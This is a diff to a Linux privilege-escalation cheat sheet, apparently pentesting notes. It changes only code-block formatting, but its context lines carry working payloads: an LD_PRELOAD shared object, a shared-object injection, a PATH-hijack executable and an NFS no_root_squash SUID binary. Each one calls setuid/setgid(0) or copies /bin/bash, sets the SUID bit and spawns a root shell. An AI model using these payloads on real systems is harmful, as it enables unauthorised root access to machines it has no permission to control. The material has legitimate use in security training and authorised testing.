@@ -160,7 +160,6 @@ When LD\_PRELOAD enviroment variable is set and you run the executable, ld will 
 
 Firstly we create source code file for a shared object.
 
-{% code title="shell.c" %}
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -173,7 +172,6 @@ void _init(){
     system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
 }
 ```
-{% endcode %}
 
 Then compile this C code as a shared object.
 
@@ -258,7 +256,6 @@ strace <executable> 2>&1
 strace <executable> 2>&1 | grep -i -E "open|access|no such file"
 ```
 
-{% code title="shared\_object.c" %}
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -269,7 +266,6 @@ void inject(){
     system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
 }
 ```
-{% endcode %}
 
 Compile shared object with gcc.
 
@@ -291,7 +287,6 @@ strings <executable>
 
 When you find executable called without full path, create your own with same name.
 
-{% code title="executable.c" %}
 ```c
 void main(){
     setgid(0);
@@ -299,7 +294,6 @@ void main(){
     system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
 }
 ```
-{% endcode %}
 
 Then compile it.
 
@@ -412,7 +406,6 @@ mount -o rw,vers=2 <RHOST>:/<remote_folder> /tmp/<local_folder>
 
 Create a .c file inside your newly mounted folder.
 
-{% code title="malicious.c" %}
 ```c
 void main(){
     setgid(0);
@@ -420,7 +413,6 @@ void main(){
     system("cp /bin/bash /tmp/yz && chmod +s /tmp/yz && /tmp/yz -p");
 }
 ```
-{% endcode %}
 
 Compile it and set SUID bit on.
 
